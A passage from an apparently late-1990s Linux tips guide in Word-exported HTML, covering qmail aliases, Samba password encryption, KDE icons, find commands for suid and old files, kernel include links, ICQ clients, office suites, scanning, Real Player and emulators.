>&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Edit a file called .qmail-username where username is the alias you want to add.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Add the address in the file with a &amp; in front of it.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Here is an example of a .qmail-username file:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >&amp;me@mydomain.com</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >&amp;meagain@some.other.domain.net</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This will forward any mail going to user "username" to the 2 listed email addresses.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.9</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 9: Samba with Windows 98 or NT 4</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Samba is a product allowing you to connect your Linux systems to Windows systems for file and printer</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >sharing. By default the SMB protocol used by Samba sends passwords in clear text. Windows 98 and NT use</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >encrypted passwords.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If you can't seem to connect from a Windows system on a Samba server, it might well be because the Samba</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >server doesn't know about the encrypted passwords. You need to read the documentation about encryption in</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >the Samba package. There is a utility to convert a Linux /etc/passwd file to encrypted mode so Samba can</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >support Windows encrypted passwords.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Note that Samba also works with Windows 3.1 and Windows 95, with no encryption.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.10</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 10: KDE drag and drop icons</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >KDE is a window manager for the X Window system. It comes with a toolbar at the bottom of the screen and</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >default buttons. You can drag icons from your desktop to the toolbar. The problem is that there is no option to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >add icons.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The trick is to drag a file on the toolbar and then edit it. Open KFM and drag the program you want on the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >toolbar. You can then edit it and change the settings of the new icon in the toolbar:</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.11</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 11: Find files</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Find is a very useful and powerful utility. It is often used by system administration and in shell scripts. Here</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >are 2 commands that might be useful:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >find / -perm -4000 -print</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This command will find every file on the system that is suid. This means that when you run it you will be</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >running it as an other user. For example, traceroute is a utility that needs to be run as root. To allow users to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >run it, systems administrators will set it suid root so it will be run as root even if a user starts it. This can be</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >useful, but can also be a big security risk if the utility has a security hole in it.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Here is another interesting command:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >find / -atime +10 -print</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This command will find all the files accessed more than 10 days ago. Commands like this one can be useful</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >to find old files that need to be backuped or erased.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.12</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 12: asm or linux include files not found</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >On older Linux systems, you may have some errors about include files not found in the asm/ or linux/</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >directory when you try to compile some programs. This means that the kernel source code was not installed.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Bot asm/ and linux/ directories are links to the kernel source code.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To install them on your system, you need to get the kernel source code. Then you need to link the directories:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >ln -s /usr/src/linux/include/asm /usr/include/asm</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >ln -s /usr/src/linux/include/linux /usr/include/linux</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This will link the 2 directories in the include tree allowing applications to find them.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.13</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 13: ICQ on Linux</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The original ICQ client does not currently run on Linux. Fortunately, there are clones that do run on Linux</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >and offer the ICQ service to users. A popular ICQ program is Licq available from </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://licq.wibble.net</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >.</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >Another popular one is Micq available at </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://micq.chatzone.org</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >. Other ICQ programs are also available for</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux. This is licq:</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.14</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 14: </FONT></SPAN></SPAN></A><FONT size="2" ><SPAN style="mso-bookmark: _Toc196894762;"  ><SPAN lang="EN-US" >Reading</SPAN></SPAN><SPAN style="mso-bookmark: _Toc196894762;"  ><SPAN lang="EN-US" > foreign documents</SPAN></SPAN></FONT></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux comes with various freely available word processors and office suites. Unfortunately, Microsoft Office</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >doesn't come with a Linux native port. But you can still read and write Word and Excel files.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Word Perfect is a Corel word processor product that has a Linux port. The latest version is Word Perfect 8. It</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >is available freely for personal use on Linux, and will read and write Word files. It is available from</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://linux.corel.com</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >. Another program is Star Office. This product from Star Division looks very much like</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Microsoft Office and offers similar features. It will also read and write all kinds of file formats. Star Office is</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >available freely for personal use from </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  ><A rel="nofollow" href="http://www.stardivision.com/"  >http://www.stardivision.com</A></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >:</SPAN></FONT></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.15</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 15: Scanning with Linux</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >A number of scanning programs exist for Linux. A popular one currently is SANE which stands for "Scanner</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >Access Now Easy" and is available from </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.mostang.com/sane</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >. It is an application programming</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >interface that provides standardized access to scanners.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Several graphical frontends are also available from the SANE Web page.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.16</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 16: Real audio and video</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Real Networks has released their Real Player for Linux. Unfortunately, many users had problems setting it</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >up. When running an older kernel, you may need to disable the 16bits sound playback. When running the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux kernel 2.2 with Real Player 5.0, you may need to use a workaround to get the Real Player to work. The</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >workaround is available from the Web.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Real Networks provides the Real Player for Linux and for RedHat Linux. The RedHat Linux version comes</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >in the RPM format. Here it is:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  ></FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.17</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 17: Emulation</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux is source compatible with Unix. This means that all of the Unix programs should work on Linux when</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >compiled correctly, with little or no change to the source. Unix does provide a wide variaty of software</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >programs, but some programs are only available on non-Unix systems.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >A number of emulators are available on Linux. We'll see 4 of them:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >One of them is called WINE and stands for WINE Is Not an Emulator. It used to stand for</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Windows Emulator. WINE will run various Windows 16bits and 32bits applications. The</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >home page for WINE is at </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.winehq.com</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >.</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To emulate DOS programs, a program called DOSemu exists. That program comes with an X</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Window interface and a console interface. It will run most DOS programs. You may want to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >run graphic-intensive programs like DOS games in the console interface of DOSemu. Like</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >WINE, DOSemu is a free product.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To emulate MacOS programs, a commercial program called Executor exists. It will run a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN 